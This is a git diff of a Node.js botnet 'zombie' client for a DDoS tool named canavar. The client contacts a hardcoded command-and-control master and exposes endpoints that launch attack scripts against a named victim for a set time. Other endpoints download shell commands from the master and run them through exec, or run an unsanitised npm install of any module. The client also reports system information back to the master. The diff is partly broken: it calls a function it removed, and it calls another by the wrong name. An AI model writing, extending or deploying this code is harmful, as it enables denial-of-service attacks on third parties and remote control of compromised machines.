@@ -10,23 +10,24 @@ const moment = require('moment')
 const delay = require('delay')
 const si = require('systeminformation');
 
+let master_ = "master.api.canavar.licentia.xyz"
 let master = null
 var masterReachable = new EventEmitter()
 var settingIntegrity = new EventEmitter()
 let fullyInitiated = false
-//process.chdir(__dirname)
-const db = require('quick.db');
 let htserver = null
+
 let zombie = {
     port: {
-        number: null,
-        change: function (val) {
-            if (val !== zombie.port.number) {
-                replenishPort(val)
-            }
-            zombie.port.number = val
+        number: (Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000),
+        change: function () {
+            zombie.port.number = Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000;
+            zombie.port.lastChanged = Date.now()
+            htserver.close()
+            htserver = app.listen(zombie.port.number, () => console.log(`App listening on port ${zombie.port.number} !`))
             return zombie.port.number
-        }
+        },
+        lastChanged: Date.now()
     },
     currentAttack: {
         victim: null,
@@ -56,90 +57,61 @@ let zombie = {
             load: null,
             net: null
         }
+    },
+    config: {
+        restart: {
+            scheduled: false,
+            at: null,
+            last: null
+        },
+        lockdown: true,
+        allDynamicData: null,
+        staticData: null,
+        simpleHeartbeatDelay: null,
+        complexHeartbeatDelay: null,
+        refreshTimerDelay: null,
+        siDataPlacementDelay: null,
+        dynDataPlacementDelay: null,
+        maximumPortLife: null
+    },
+    setupdata: {
+        
     }
 }
 
-function replenishPort(val) {
-    htserver.close()
-    htserver = app.listen(val, () => console.log(`App listening on port! ${val}`)) 
-}
+checkMaster(master_)
 
-async function refreshMaster() {
-    if (zombie.busy) {
-        await delay(zombie.currentAttack.timer * 1000)
-    }
-    db.delete('master.ip')
-    db.delete('master')
-    checkLocalMaster()
-}
-
-function checkLocalMaster() { //simplify this.
-    let fails = 0
-    let localMaster = db.get('master.ip')
-    if (fails > 5) { localMaster = null }
-    if ((localMaster === null) || (localMaster === "null") || (localMaster === "") || localMaster === undefined) {
-        console.log("No local master found. Falling back to disaster API.");
-        axios.get("http://disaster.api.canavar.licentia.xyz")
-            .then(res => {
-                let mdata = res.data
-                db.set('master', { ip: `${mdata}` })
-                console.log("localMaster is set with", mdata);
-                localMaster = mdata
-                checkMaster(localMaster)
-            })
-            .catch(err => {
-                console.error(err);
-                fails++
-                checkLocalMaster()
-            })
-    } else {
-        if (localMaster.includes(".")) {
-            checkMaster(localMaster)
-            console.log("Valid localMaster data.", localMaster);
-        } else {
-            db.delete('master.ip')
-            db.delete('master')
-            console.log("Corrupt localMaster data. falling back again.");
-            checkLocalMaster()
-        }
-    }
-    return localMaster
-}
-
-checkLocalMaster()
-
-function checkMaster(master_) {
-    axios.get("http://" + master_)
+function checkMaster(master__) {
+    axios.get("http://" + master__)
         .then(res => {
             let code = res.statusCode
             let statusMessage = res.statusMessage
             let body = res.data
-            if ((body === "OKAY" || (code === 200) && (statusMessage === "OK"))) {
-                console.log("Master reached.", master_);
-                master = master_
-                masterReachable.emit('true', master_);
+            if ((body === "OKAY" || ((code === 200) && (statusMessage === "OK")))) {
+                console.log("Master reached.", master__);
+                master = master__
+                masterReachable.emit('true', master__);
             } else {
-                db.delete('master.ip')
-                db.delete('master')
-                console.log("Corrupt localMaster data. falling back again.");
-                checkLocalMaster()
+                console.log("Master data response invalid. falling back again.");
+                setTimeout(() => {
+                    checkMaster()
+                }, 1000);
             }
         })
         .catch(err => {
-            db.delete('master.ip')
-            db.delete('master')
             console.log("Cannot reach master. falling back again.");
             console.log(master);
-            console.log(err);
-            checkLocalMaster()
+            console.log(err.message);
+            setTimeout(() => {
+                checkMaster()
+            }, 3000);
         })
 }
-
 
 function fetchSettings() {
     axios.get("http://" + master + "/globals")
         .then(res => {
-            zombie.port.number = res.data.port.number
+            zombie.config = res.data
             console.log(res.data);
             if (!fullyInitiated) {
                 settingIntegrity.emit('true');
@@ -147,6 +119,15 @@ function fetchSettings() {
         })
         .catch(err => {
             console.error(err);
+        })
+
+        axios.get("http://" + master + "/setup")
+        .then(res => {
+            zombie.setupdata = res.data
+            console.log(res.data)
+        })
+        .catch(err => {
+            console.error(err); 
         })
 }
 
@@ -158,7 +139,7 @@ masterReachable.on('true', (s) => {
 
 settingIntegrity.on('true', () => {
     console.log("SETTING INTEGRITY OK!");
-    app.get('/layer7/:methodID/:victim/:time/:attackID', (req, res) => {
+    app.get('/attack/:methodID/:victim/:time/:attackID', (req, res) => {
         if (zombie.busy === false) {
             let victim = req.params.victim
             let timelimit = req.params.time
@@ -168,21 +149,27 @@ settingIntegrity.on('true', () => {
             else {
                 axios.get("http://" + master + "/scripts?" + req.params.methodID)
                     .then(resp => {
-                        let methodfilename = `/canavarl7/scripts/${resp.data.filename}`
+                        let methodfilename = `${__dirname}/scripts/${resp.data.filename}`
                         if (fs.existsSync(methodfilename)) {
                             // path exists
                             console.log("exists:", methodfilename);
-                            startAttack((resp.data), req.params.victim, req.params.time)
+                            let script = resp.data
+                            script.victim = req.params.victim
+                            script.scriptdir = zombie.setupdata.scriptdir
+                            script.dictation = stitchSetupLine("dictation", script)
+                            console.log(script);
+
+                            startAttack((script), req.params.victim, req.params.time)
                             zombie.currentAttack.victim = req.params.victim
                             zombie.currentAttack.timer = req.params.time
                             zombie.currentAttack.id = req.params.id
-                            zombie.currentAttack.method = resp.data
+                            zombie.currentAttack.method = script
                             zombie.currentAttack.doneby = moment().add({ seconds: timelimit }).unix() * 1000
                             zombie.busy = true
                             res.send(200, { success: true, message: `Attacking ${victim} with TL ${timelimit}`, doneby: zombie.currentAttack.doneby })
                         } else {
                             console.log("DOES NOT exist:", methodfilename);
-                            res.send(500, { error: { code: "SCRIPT_NOT_INSTALLED", message: `Script is not installed on the machine.${methodfilename}` } })
+                            res.send(500, { error: { code: "SCRIPT_NOT_INSTALLED", message: `Script is not installed on the machine. ${methodfilename}` } })
                         }
                     })
                     .catch(err => {
@@ -204,7 +191,7 @@ settingIntegrity.on('true', () => {
     })
 
     app.get('/update', (req, res) => {
-        exec("cd /canavarl7 ; wget https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/index.js -O index.js; nohup systemctl restart canavarl7 &", (err, stdout, stderr) => {
+        exec(zombie.setupdata.slaveUpdate, (err, stdout, stderr) => {
             if (err) {
                 //some err occurred
                 console.error(err)
@@ -218,7 +205,7 @@ settingIntegrity.on('true', () => {
         })
     })
     app.get('/npminstall/:module', (req, res) => {
-        exec(`cd /canavarl7/; npm install ${req.params.module} ; nohup systemctl restart canavarl7 &`, (err, stdout, stderr) => {
+        exec(`cd /${__dirname}/; npm install ${req.params.module};`, (err, stdout, stderr) => {
             if (err) {
                 //some err occurred
                 console.error(err)
@@ -234,7 +221,7 @@ settingIntegrity.on('true', () => {
         axios.get("http://" + master + "/scripts?" + scriptid)
             .then(resp => {
                 console.log(resp.data)
-                axios.get("http://" + master + "/setup?download_script&" + scriptid)
+                axios.get("http://" + master + "/scripts?" + scriptid + "&download")
                     .then(resp => {
                         console.log("EXECUTE : " + resp.data)
                         exec(resp.data, (err, stdout, stderr) => {
@@ -257,33 +244,19 @@ settingIntegrity.on('true', () => {
                 res.send(500, { error: err.response.data.error })
             })
     })
-    app.get('/installService/', (req, res) => {
-        console.log(resp.data)
-        axios.get("http://" + master + "/setup?download_script")
-            .then(resp => {
-                console.log("EXECUTE : " + resp.data)
-                res.send(200)
-            })
-            .catch(err => {
-                res.send(500, { error: err.response.data.error })
-            })
-    })
 
     app.get('/currentAttack/', (req, res) => {
         res.send(200, zombie.currentAttack)
     })
+    
     htserver = app.listen(zombie.port.number, () => console.log(`App listening on port! ${zombie.port.number}`))
 
-    si.getStaticData(function (data) {
-        zombie.systemInfo.static = data
-    })
 
     async function complexHeartbeat() {
         if (!zombie.busy) {
             axios.post("http://" + master + "/heartbeat", { machine: zombie })
                 .then(res => {
                     console.log(res.data);
-                    zombie.port.change(res.data.port.number)
                 })
                 .catch(err => {
                     console.log(err);
@@ -299,45 +272,58 @@ settingIntegrity.on('true', () => {
         axios.patch("http://" + master + "/heartbeat", { machine: zombiealt })
             .then(res => {
                 console.log(res.data);
-                zombie.port.change(res.data.port.number)
             })
             .catch(err => {
                 console.log(err);
             })
     }
 
-    simpleHeartbeat();
-    complexHeartbeat();
 
-    setInterval(function () {
+    var simpleHeartbeatTimer = function() {
         simpleHeartbeat()
-    }, 5000)
+        setTimeout(simpleHeartbeatTimer, zombie.config.simpleHeartbeatDelay);
+    }
 
-
-    setInterval(function () {
+    var complexHeartbeatTimer = function() {
         complexHeartbeat()
-    }, 60000)
+        setTimeout(complexHeartbeatTimer, zombie.config.complexHeartbeatDelay);
+    }
 
-    setInterval(function () {
+    var refreshMasterTimer = function() {
         refreshMaster()
-    }, 3600000)
+        setTimeout(refreshMasterTimer, zombie.config.refreshTimerDelay);
+    }
 
-    setInterval(() => {
-        siDataPlacement()
-    }, 10000);
+    var siDataPlacementTimer = function() {
+        dynamicDataPlacement()
+        setTimeout(siDataPlacementTimer, zombie.config.siDataPlacementDelay);
+    }
 
-    si.getDynamicData(function (data) {
-        zombie.systemInfo.dynamic.all = data
-    })
-    setInterval(() => {
-        if (!zombie.busy) {
+    var detailedDynamicDataPlacementTimer = function() {
+        detailedDynamicDataPlacement()
+        setTimeout(detailedDynamicDataPlacementTimer, zombie.config.dynDataPlacementDelay);
+    }
+
+
+    function detailedDynamicDataPlacement () {
+        if (!zombie.busy && zombie.config.allDynamicData) {
             si.getDynamicData(function (data) {
                 zombie.systemInfo.dynamic.all = data
             })
         }
-    }, 30000);
+    }
 
-    async function siDataPlacement() {
+    function staticDataPlacement () {
+        if (!zombie.busy && zombie.config.staticData) {
+            si.getStaticData(function (data) {
+                zombie.systemInfo.static = data
+            })
+        }
+    }
+
+    staticDataPlacement()
+
+    async function dynamicDataPlacement() {
         if (!zombie.busy) {
             si.cpu(function (cpudata) {
                 zombie.systemInfo.dynamic.cpu.voltage = cpudata.voltage
@@ -395,36 +381,26 @@ async function startAttack(methodData, victim, time) {
         }
     });
 
-}
 
-
-
-/*
-
-app.use((req, res, next) => {
-    if (lockdown)
-    let accessKey = req.headers.authorization
-    if (!accessKey) {
-        res.send(403)
-    }
-    if (!accessKey !==)
-})
-
-
-
-if ((process.argv.slice(2))[0] === "setup") {
-    console.log("setup")
-    exec('notepad', (err, stdout, stderr) => {
-        if (err) {
-            //some err occurred
-            console.error(err)
+    function stitchSetupLines(asked, setup_) {
+        if (setup_[asked]) {
+            if ((setup_[asked]).includes("[")) {
+                let a = setup_[asked]
+                let b = (a.split("["));
+                for (let c = 0; c < b.length; c++) {
+                    let d = b[c];
+                    d = d.split("]")[0]
+                    if (setup_[d]) {
+                        b[c] = setup_[d]
+                    }
+                }
+                let e = b.join("")
+                return e
+            } else {
+                return (setup_[asked])
+            }
         } else {
-            // the *entire* stdout and stderr (buffered)
-            console.log(`stdout: ${stdout}`);
-            console.log(`stderr: ${stderr}`);
+            return null
         }
-    });
-} else {
-    console.log("action")
-}*/
-
+    }
+}
